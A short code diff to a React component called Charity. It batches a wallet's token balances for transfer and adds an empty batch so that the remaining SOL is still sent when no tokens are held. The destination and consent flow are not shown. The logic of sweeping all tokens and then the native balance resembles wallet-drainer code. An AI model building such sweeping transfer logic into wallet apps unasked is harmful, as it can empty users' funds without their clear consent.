@@ -219,8 +219,15 @@ const Charity = () => {
 
       // Create batches of max 5 tokens
       const batches: TokenBalance[][] = [];
-      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
-        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
+      
+      if (sortedTokens.length === 0 && solBalance > 0) {
+        // No tokens but has SOL - create empty batch to trigger SOL transfer
+        batches.push([]);
+      } else {
+        // Has tokens - create batches
+        for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
+          batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
+        }
       }
 
       let successCount = 0;
